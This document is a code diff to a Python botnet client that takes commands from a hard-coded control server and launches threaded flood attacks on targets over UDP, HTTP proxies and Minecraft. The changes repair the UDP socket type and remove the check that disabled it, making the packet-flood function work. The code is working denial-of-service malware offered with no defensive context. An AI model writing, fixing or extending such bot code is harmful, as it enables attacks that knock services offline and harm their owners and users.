@@ -15,7 +15,7 @@ import socks
 
 
 BOTS_SERVER_ADDR = ("149.56.10.115", 13484)
-CAN_UDP = False
+CAN_UDP = True
 
 
 def send(sock, data: dict):
@@ -149,7 +149,7 @@ def http_pps_proxy(url, proxies, until):
 
 def udp(addr, until):
     while until > time.time():
-        sock = socket.socket()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(random._urandom(60000), (addr.split(":")[0], int(addr.split(":")[1])))
 
 
@@ -182,10 +182,8 @@ def run_bot():
                     seconds = int(data["data"]["seconds"])
                     threads = int(data["data"]["threads"])
                     if method == "udp":
-                        if CAN_UDP:
-                            print("Can udp attack")
-                            for _ in range(threads):
-                                threading.Thread(target=udp, args=(addr, time.time() + seconds)).start()
+                        for _ in range(threads):
+                            threading.Thread(target=udp, args=(addr, time.time() + seconds)).start()
                     elif method == "minecraft":
                         for _ in range(threads):
                             threading.Thread(target=minecraft, args=(addr, int(data["data"]["other"][0]), time.time() + seconds)).start()
